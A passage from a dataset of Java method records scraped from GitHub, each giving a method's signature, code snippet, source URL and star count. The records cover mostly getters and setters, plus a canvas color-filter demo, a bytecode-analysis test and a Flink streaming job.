   public Date getModifyTime() {\n        return modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31348, "method_name": "setModifyTime", "class_name": "DataSourceBase", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setModifyTime(Date modifyTime) {\n        this.modifyTime = modifyTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31349, "method_name": "getParameter", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getParameter() {\n        return parameter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31350, "method_name": "setParameter", "class_name": "DataSourceBase", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameter(String parameter) {\n        this.parameterMap = null;\n        this.parameter = parameter;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31351, "method_name": "getParameterMap", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "    public Map<String, Object> getParameterMap() {\n        return parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31352, "method_name": "setParameterMap", "class_name": "DataSourceBase", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParameterMap(Map<String, Object> parameterMap) {\n        this.parameterMap = parameterMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31353, "method_name": "toString", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString(){\n        return \"\";\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31354, "method_name": "getProjectId", "class_name": "DataSourceBase", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getProjectId() {\n        return projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31355, "method_name": "setProjectId", "class_name": "DataSourceBase", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectId(Long projectId) {\n        this.projectId = projectId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/DataSourceBase.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31356, "method_name": "onDraw", "class_name": "Practice06LightingColorFilterView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        // \u4f7f\u7528 Paint.setColorFilter() \u6765\u8bbe\u7f6e LightingColorFilter\n\n        // \u7b2c\u4e00\u4e2a LightingColorFilter\uff1a\u53bb\u6389\u7ea2\u8272\u90e8\u5206\n        paint.setColorFilter(reduceRedFilter);\n        canvas.drawBitmap(bitmap, 0, 0, paint);\n\n        // \u7b2c\u4e8c\u4e2a LightingColorFilter\uff1a\u589e\u5f3a\u7eff\u8272\u90e8\u5206\n        paint.setColorFilter(addGreenFilter);\n        canvas.drawBitmap(bitmap, bitmap.getWidth() + 100, 0, paint);\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice06LightingColorFilterView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 31357, "method_name": "addHeaders", "class_name": "EmptyHeadersInjector", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> addHeaders(String url) {\n        return new HashMap<>();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/headers/EmptyHeadersInjector.java", "stars": "2", "class_props": {"extends": null, "implements": ["HeaderInjector"], "modifiers": ["public"]}}, {"id": 31358, "method_name": "testConcatStrings_SwapOrder", "class_name": "TestInstructionTracking", "params": [], "throws": ["AnalyzerException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void testConcatStrings_SwapOrder() throws AnalyzerException {\n\t\tClassNode node = getFromName(\"bin/custom/misc/HelloWorldSwapOrdering.class\");\n\t\tMethodNode method = getMethod(node, \"helloVariables\");\n\t\tFrame<AbstractValue>[] frames = TestUtils.getFrames(node.name, method);\n\t\tint index = getMethodCallIndex(method.instructions, \"println\");\n\t\t// The following is the disassembly of the method \"helloVariables\"\n\t\t//\n\t\t// Lines prefixed with \">>>>>>>>>>>>>\" indicate they are contributing instructions\n\t\t// to the value \"Hello World\" at the given frame index.\n\t\t//\n\t\t// GOTO C\n\t\t// A:\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> NEW java/lang/StringBuilder\n\t\t// DUP\n\t\t// INVOKESPECIAL java/lang/StringBuilder.<init>()V\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> LDC \" \"\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.append(Ljava/lang/String;)Ljava/lang/StringBuilder;\n\t\t// >>>>>>>>>>>>> INVOKEVIRTUAL java/lang/StringBuilder.toString()Ljava/lang/String;\n\t\t// GETSTATIC java/lang/System.out Ljava/io/PrintStream;\n\t\t// >>>>>>>>>>>>> SWAP\n\t\t// INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V\n\t\t// GOTO D\n\t\t// B:\n\t\t// >>>>>>>>>>>>> LDC \"World\"\n\t\t// GOTO A\n\t\t// ATHROW\n\t\t// C:\n\t\t// >>>>>>>>>>>>> LDC \"Hello\"\n\t\t// GOTO B\n\t\t// D:\n\t\t// RETURN\n\t\tList<AbstractInsnNode> insns = FrameUtil.getTopStack(frames[index]).getInsns();\n\t\tassertEquals(12, insns.size());\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/java/me/coley/analysis/instruction/TestInstructionTracking.java", "stars": "12", "class_props": {"extends": "TestUtils", "implements": null, "modifiers": ["public"]}}, {"id": 31359, "method_name": "signup", "class_name": "SignupBusinessServiceImpl", "params": ["UserEntity"], "throws": ["SignUpRestrictedException"], "modifiers": ["public"], "return_type": "UserEntity", "snippet": "\tpublic UserEntity signup(UserEntity userEntity) throws SignUpRestrictedException{\n\t\tString[] encryptedText = passwordCryptographyProvider.encrypt(userEntity.getPassword());\n\t\tuserEntity.setSalt(encryptedText[0]);\n\t\tuserEntity.setPassword(encryptedText[1]);\n\n\t\treturn userDao.createUser(userEntity);\n\n\t}", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/business/SignupBusinessServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["SignupBusinessService"], "modifiers": ["public"]}}, {"id": 31360, "method_name": "maskInform", "class_name": "ExtInformController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Response<String>", "snippet": "    public Response<String> maskInform(){\n        return null;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/external/ExtInformController.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31361, "method_name": "getLine", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getLine() {\n\t\treturn this.line;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31362, "method_name": "getColumn", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getColumn() {\n\t\treturn this.column;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31363, "method_name": "getIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getIndent() {\n\t\treturn indent;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31364, "method_name": "setIndent", "class_name": "Code", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setIndent(int indent) {\n\t\tthis.indent = indent;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31365, "method_name": "generateCode", "class_name": "Code", "params": [], "throws": ["CodeException"], "modifiers": ["public", "abstract"], "return_type": "String", "snippet": "\tpublic abstract String generateCode() throws CodeException;\n\n\tpublic String tab() {\n\t\tString result = \"\";\n\t\tfor (int i=1 ; i <= indent*3 ; ++i)\n\t\t\tresult += \" \";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31366, "method_name": "tab", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String tab() {\n\t\tString result = \"\";\n\t\tfor (int i=1 ; i <= indent*3 ; ++i)\n\t\t\tresult += \" \";\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31367, "method_name": "incIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void incIndent() {\n\t\t++indent;\n\t\tindent();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31368, "method_name": "decIndent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void decIndent() {\n\t\t--indent;\n\t\tindent();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31369, "method_name": "getId", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getId() {\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31370, "method_name": "indent", "class_name": "Code", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "\tpublic abstract void indent();\n\n}\n\n", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Code.java", "stars": "3", "class_props": {"extends": null, "implements": ["CodeInt"], "modifiers": ["public", "abstract"]}}, {"id": 31371, "method_name": "videoUpdate", "class_name": "VideoController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JsonData", "snippet": "    public JsonData videoUpdate(){\n        return JsonData.buildSuccess();\n    }", "url": "https://raw.githubusercontent.com/MandalasWang/rbac_shiro/master/src/main/java/ink/boyuan/rbac_shiro/controller/VideoController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31372, "method_name": "main", "class_name": "FaceRecognitionApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(FaceRecognitionApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/FaceRecognitionApplication.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31373, "method_name": "getId", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31374, "method_name": "setId", "class_name": "Setting", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31375, "method_name": "getSiteName", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteName() {\n        return siteName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31376, "method_name": "setSiteName", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteName(String siteName) {\n        this.siteName = siteName;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31377, "method_name": "getSiteDonation", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteDonation() {\n        return siteDonation;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31378, "method_name": "setSiteDonation", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteDonation(String siteDonation) {\n        this.siteDonation = siteDonation;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31379, "method_name": "getSiteMusic", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteMusic() {\n        return siteMusic;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31380, "method_name": "setSiteMusic", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteMusic(String siteMusic) {\n        this.siteMusic = siteMusic;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31381, "method_name": "getSiteLinks", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSiteLinks() {\n        return siteLinks;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31382, "method_name": "setSiteLinks", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSiteLinks(String siteLinks) {\n        this.siteLinks = siteLinks;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31383, "method_name": "getAbout", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAbout() {\n        return about;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31384, "method_name": "setAbout", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAbout(String about) {\n        this.about = about;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31385, "method_name": "getAboutMd", "class_name": "Setting", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAboutMd() {\n        return aboutMd;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31386, "method_name": "setAboutMd", "class_name": "Setting", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAboutMd(String aboutMd) {\n        this.aboutMd = aboutMd;\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Setting.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31387, "method_name": "index", "class_name": "HomeController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String index() {\n        System.out.println(\"swagger-ui.html\");\n        return \"redirect:swagger-ui.html\";\n    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/io/swagger/configuration/HomeController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31388, "method_name": "getTimeZone", "class_name": "TimeIssController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getTimeZone(){\n        lat = issData.getLat();\n        lon = issData.getLon();\n        String url = \"https://api.ipgeolocation.io/timezone?apiKey=\"+ apikeyipgeolocation + \"&lat=\"+lat+\"&long=\" + lon;\n        RestTemplate restTemplate = new RestTemplate();\n        HttpEntity httpEntityTimeISS = new HttpEntity(timeISS);\n        ResponseEntity<TimeISS> exchange = restTemplate.exchange(url, HttpMethod.GET, httpEntityTimeISS, TimeISS.class);\n        this.timeISS = exchange.getBody();\n        issData.setLocalTimeISS(LocalTime.parse(timeISS.getTime24(), DateTimeFormatter.ofPattern(\"HH:mm:ss\")));\n    }", "url": "https://raw.githubusercontent.com/wojciechgalach/PositionInternationalSpaceStation/master/src/main/java/pl/com/nur/internationalspacestation/internationalspacestation/controller/TimeIssController.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31389, "method_name": "main", "class_name": "StreamingJob", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws Exception {\n\n\t\tConfiguration config = new Configuration();\n\t\tconfig.setBoolean(ConfigConstants.LOCAL_START_WEBSERVER, true);\n\t\tconfig.setString(RestOptions.BIND_PORT, \"8081\");\n\n\t\t// set up the streaming execution environment\n\t\tfinal StreamExecutionEnvironment env = StreamExecutionEnvironment.createLocalEnvironmentWithWebUI(config);\n\t\tenv.setStreamTimeCharacteristic(TimeCharacteristic.ProcessingTime);\n\n\n\n\t\tString test = \"\";\n\t\tString topicName = \"sparkStream\";\n\t\tString bootStrapServers = \"localhost:9092\";\n\t\tint queryOption = 1;\n\t\tdouble radius =  0.004;\n\t\tint uniformGridSize = 100;\n\t\tint windowSize = 10; // in seconds\n\t\tint windowSlideStep = 5; // in seconds\n\t\tint k = 3;\n\n\t\t// Boundaries for Taxi Drive dataset\n\t\tdouble minX = 115.50000;     //X - East-West longitude\n\t\tdouble maxX = 117.60000;\n\t\tdouble minY = 39.60000;     //Y - North-South latitude\n\t\tdouble maxY = 41.10000;\n\n\t\t// Defining Grid\n\t\tUniformGrid uGrid = new UniformGrid(uniformGridSize, minX, maxX, minY, maxY);\n\n\t\t// Preparing Kafka Connection to Get Stream Tuples\n\t\tProperties kafkaProperties = new Properties();\n\t\tkafkaProperties.setProperty(\"bootstrap.servers\", bootStrapServers);\n\t\tkafkaProperties.setProperty(\"group.id\", \"messageStream\");\n\t\tDataStream geoJSONStream  = env.addSource(new FlinkKafkaConsumer<>(topicName, new JSONKeyValueDeserializationSchema(false), kafkaProperties).setStartFromEarliest());\n\t\t//DataStream csvStream  = env.addSource(new FlinkKafkaConsumer<>(topicName, new SimpleStringSchema(), kafkaProperties).setStartFromEarliest());\n\n\t\t// Converting GeoJSON,CSV stream to point spatial data stream\n\t\tDataStream<Point> spatialStream = SpatialStream.PointStream(geoJSONStream, \"GeoJSON\", uGrid);\n\t\t//DataStream<Point> spatialStream = SpatialStream.PointStream(csvStream, \"CSV\", uGrid);\n\n\t\t// Creating a query point\n\t\tPoint queryPoint = new Point(116.414899, 39.920374, uGrid);\n\n\t\tswitch(queryOption) {\n\n\t\t\tcase 1: { // Range Query (Grid-based)\n\t\t\t\tDataStream<Point> rNeighbors= RangeQuery.SpatialRangeQuery(spatialStream, queryPoint, radius, windowSize, windowSlideStep, uGrid);  // better than equivalent GB approach\n\t\t\t\trNeighbors.print();\n\t\t\t\tbreak;}\n\t\t\tcase 2: { // KNN (Grid based - Iterative approach)\n\t\t\t\tDataStream < PriorityQueue < Tuple2 < Point, Double >>> kNNPQStream = KNNQuery.SpatialKNNQuery(spatialStream, queryPoint, k, windowSize, windowSlideStep, uGrid);\n\t\t\t\tkNNPQStream.print();\n\t\t\t\tbreak;}\n\t\t\tcase 3: { // Spatial Join (Grid-based)\n\t\t\t\tDataStream geoJSONQueryStream  = env.addSource(new FlinkKafkaConsumer<>(\"TaxiDriveQueries1MillionGeoJSON_Live\", new JSONKeyValueDeserializationSchema(false),kafkaProperties).setStartFromLatest());\n\t\t\t\tDataStream<Point> queryStream = SpatialStream.PointStream(geoJSONQueryStream, \"GeoJSON\", uGrid);\n\t\t\t\tDataStream<Tuple2<String, String>> spatialJoinStream = JoinQuery.SpatialJoinQuery(spatialStream, queryStream, radius, windowSize, windowSlideStep, uGrid);\n\t\t\t\tspatialJoinStream.print();\n\t\t\t\tbreak;}\n\t\t\tdefault:\n\t\t\t\tSystem.out.println(\"Input Unrecognized. Please select an option from 1-3.\");\n\t\t}\n\n\t\t// execute program\n\t\tenv.execute(\"Geo Flink\");\n\t}", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/StreamingJob.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 31390, "method_name": "main", "class_name": "SampleHazelcast4Application", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SampleHazelcast4Application.class, args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-hazelcast4/src/main/java/smoketest/hazelcast4/SampleHazelcast4Application.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31391, "method_name": "registerCache", "class_name": "SampleHazelcast4Application", "params": ["CountryRepository", "HazelcastCacheManager", "CacheMetricsRegistrar"], "throws": null, "modifiers": ["public"], "return_type": "ApplicationRunner", "snippet": "\tpublic ApplicationRunner registerCache(CountryRepository repository, HazelcastCacheManager cacheManager,\n\t\t\tCacheMetricsRegistrar registrar) {\n\t\treturn (args) -> {\n\t\t\trepository.findByCode(\"BE\");\n\t\t\tregistrar.bindCacheToRegistry(cacheManager.getCache(\"countries\"));\n\t\t};\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-hazelcast4/src/main/java/smoketest/hazelcast4/SampleHazelcast4Application.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31392, "method_name": "custo", "class_name": "GatewayCielo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal custo() {\n\t\treturn BigDecimal.ONE;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayCielo.java", "stars": "9", "class_props": {"extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"id": 31393, "method_name": "paga", "class_name": "GatewayCielo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CompletableFuture<Transacao>", "snippet": "\tpublic CompletableFuture<Transacao> paga() {\n\t\tautorizador.autoriza(110, true);\n\t\tSystem.out.println(\"[Cielo] \"+tentativaPagamento);\n\t\treturn CompletableFuture.completedFuture(new Transacao());\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/GatewayCielo.java", "stars": "9", "class_props": {"extends": null, "implements": ["Pagador"], "modifiers": ["public"]}}, {"id": 31394, "method_name": "getProjectCategoryName", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getProjectCategoryName() {\n        return projectCategoryName;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31395, "method_name": "setId", "class_name": "Project", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31396, "method_name": "getId", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31397, "method_name": "getProjectScreenshots", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Integer>", "snippet": "    public ArrayList<Integer> getProjectScreenshots() {\n        return projectScreenshots;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31398, "method_name": "getProject", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProject() {\n        return project;\n    